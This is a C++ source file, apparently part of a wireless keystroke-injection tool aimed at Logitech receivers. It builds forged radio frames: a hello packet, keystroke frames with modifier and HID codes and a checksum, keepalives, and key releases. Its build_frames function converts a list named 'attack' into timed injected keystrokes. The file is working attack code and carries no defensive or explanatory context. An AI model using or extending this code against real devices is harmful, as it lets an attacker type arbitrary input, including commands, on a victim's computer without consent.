#include "stdafx.h"
#include "HidLogitech.h"


unsigned char HidLogitech::m_payload_template[10] = { 0, 0xc1, 0, 0, 0, 0, 0, 0, 0, 0 };
unsigned char HidLogitech::m_keepalive[5] = { 0x00, 0x40, 0x04, 0xb0, 0x0c };
unsigned char HidLogitech::m_hello[10] = { 0x00, 0x4f, 0x00, 0x04, 0xb0, 0x10, 0x00, 0x00, 0x00, 0xed };

HidLogitech::HidLogitech()
{
	
}


HidLogitech::~HidLogitech()
{
}

std::string& HidLogitech::checksum(std::string& payload)
{
	unsigned char cksum = 0xFF;
	for (size_t i = 0; i < payload.size(); i++)
	{
		cksum = (cksum - payload.data()[i]) & 0xFF;
	}
	cksum = (cksum + 1) & 0xff;
	((unsigned char*)payload.data())[payload.size() - 1] = cksum;
	return payload;
}

std::string& HidLogitech::key(std::string& payload, blank_entry& key)
{
	((unsigned char*)payload.data())[2] = key.mod;
	((unsigned char*)payload.data())[3] = key.hid;
	return payload;
}

std::string HidLogitech::frame(blank_entry& key)
{
	std::string payload((char*)HidLogitech::m_payload_template, sizeof(HidLogitech::m_payload_template));
	return checksum(this->key(payload, key));
}

std::vector<blank_entry> & HidLogitech::build_frames(std::vector<blank_entry> & attack)
{
	for (size_t i = 0; i < attack.size(); i++)
	{
		blank_entry* curr_key = &attack[i];
		if (i == 0) {
			frame_entry curr_frame;
			curr_frame.frame = std::string((char*)HidLogitech::m_hello, sizeof(HidLogitech::m_hello));
			curr_frame.frame_sleep = 12;
			curr_key->frames.push_back(curr_frame);
		}
		
		blank_entry* next_key = NULL;
		if (i < attack.size() - 1) {
			next_key = &attack[i + 1];
		}
		else {
			next_key = NULL;
		}

		if (curr_key->hid || curr_key->mod) {
			{
				frame_entry curr_frame ;
				curr_frame.frame = this->frame(*curr_key);
				curr_frame.frame_sleep = 12;

				curr_key->frames.push_back(curr_frame);
			}
			{
				frame_entry curr_frame ;
				curr_frame.frame = std::string((char*)HidLogitech::m_keepalive, sizeof(HidLogitech::m_keepalive));
				curr_frame.frame_sleep = 0;
				curr_key->frames.push_back(curr_frame);
			}

			if (!next_key || curr_key->hid == next_key->hid || next_key->sleep) {

				blank_entry bk;
				bk.mod = 0;
				bk.hid = 0;
				bk.sleep = 0;
				frame_entry curr_frame;
				curr_frame.frame = this->frame(bk);
				curr_frame.frame_sleep = 0;

				curr_key->frames.push_back(curr_frame);
			}
		}
		else if (curr_key->sleep) {
			int count = curr_key->sleep / 10;
			for (int j = 0; j < count; j++)
			{
				frame_entry curr_frame;
				curr_frame.frame = std::string((char*)HidLogitech::m_keepalive, sizeof(HidLogitech::m_keepalive));
				curr_frame.frame_sleep = 10;
				curr_key->frames.push_back(curr_frame);
			}
		}
	}

	return attack;
}

bool HidLogitech::fingerprint(std::string& payload)
{
	return true;
}
